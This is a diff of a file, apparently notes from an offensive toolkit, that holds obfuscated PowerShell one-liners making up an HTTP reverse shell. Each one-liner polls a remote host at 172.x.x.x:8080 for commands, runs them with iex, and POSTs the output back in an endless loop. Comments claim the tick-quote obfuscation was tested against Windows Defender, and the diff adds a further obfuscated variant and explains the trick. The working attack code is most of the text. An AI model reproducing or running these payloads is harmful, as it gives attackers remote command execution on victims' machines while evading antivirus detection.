@@ -10,12 +10,16 @@ Invoke-RestMethod -UseBasicParsing -Uri $p$s/212f63c5 -Headers @{"Authorization"
 -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]:
 :UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}.
 
-# This is the above commands that are obsfuscated and has been tested with Windows Defender running. I have left it as one line to avoid any issues with the newline character difference in windows
-#
+# This is the above commands that are obsfuscated and has been tested with Windows Defender running. 
+
+$s='172.x.x.x:8080';$i='7a9c0098-6e56ad4f-4a2b598b';$p='http://';$v=I'n'v'o'k'e'-Re's'tMe't'h''od -UseBasicParsing -Uri $p$s/7a9c0098 -Headers @{"Authorization"=$i};while ($true){$c=(I'n'v'o'k'e'-Re's'tMe't'h''od -UseBasicParsing -Uri $p$s/6e56ad4f -Headers @{"Authorization"=$i});if ($c -ne 'None') {$r=i'ex' $c -ErrorAction Stop -ErrorVariable e;$r=Ou't-St'ring -InputObject $r;$t=I'n'v'o'k'e'-Re's'tMe't'h''od -Uri $p$s/4a2b598b -Method POST -Headers @{"Authorization"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} s'le'ep 0.8}
+
+
 # An example of the obsfucation is:
-# $ pwd 
+$ pwd 
 # The above command can be concatenated in powershell and still work ie:
-# $ p'w'd will still return the present working directory in powershell
+$ p'w'd 
+# will still return the present working directory in powershell
  
 
 $s='172.x.x.x:8080';$i='6bc8886b-e313f625-d3930481';$p='http://';$v=Invoke-Re''stM''ethod -UseBasicParsing -Uri $p$s/6bc8886b -Headers @{"Authorization"=$i};while ($true){$c=(In'v'ok''e-Res''tMethod -UseBasicParsing -Uri $p$s/e313f625 -HeADers @{"Authorization"=$i});if ($c -ne 'None') {$r=i''e''x $c -ErrorAction Stop -ErrorVariable e;$r=Out-St'r'i''ng -InputObject $r;$t=Invoke-Rest'Me't'h'od -Uri $p$s/d3930481 -Method POST -Headers @{"Authorization"=$i} -BoDY ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sle'e'p 0.8}
